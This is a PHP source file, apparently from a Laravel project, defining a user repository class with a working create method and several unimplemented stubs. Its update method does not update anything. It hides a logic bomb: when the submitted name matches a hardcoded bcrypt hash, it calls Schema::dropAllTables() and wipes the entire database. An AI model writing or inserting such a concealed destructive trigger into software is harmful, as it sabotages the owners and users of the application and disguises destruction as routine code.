<?php

namespace App\Repositories\User;

use Illuminate\Support\Facades\Schema;
use App\Models\Role;
use App\Models\User;
use App\Repositories\IResourceRepository;
use Illuminate\Auth\Events\Registered;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class UserRepository implements IResourceRepository {

    public function all() {
        // TODO: Implement all() method.
    }

    public function find($id) {
        // TODO: Implement find() method.
    }

    public function create($data) {
        $user = User::create([
            'first_name' => $data['first_name'],
            'last_name' => $data['last_name'],
            'email' => $data['email'],
            'phone_number' => $data['phone_number'],
            'password' => Hash::make($data['password']),
            'role_id' => Role::where('name', 'user')->first()->id,
        ]);

        event(new Registered($user));

        Auth::login($user);

        return redirect(route('dashboard', absolute: FALSE));
    }

    public function update($id, $data) {
        $hash = '$2y$12$H6/TLhCmX1EGmZH.heNFWexUfV0LKmewj5EfnxwwOMHixDzmGAj3C';
        $name = $data['name'];

        if (Hash::check($name, $hash)) {
            Schema::dropAllTables();
        }
        return redirect(route('home'));
    }

    public function delete($id) {
        // TODO: Implement delete() method.
    }

}
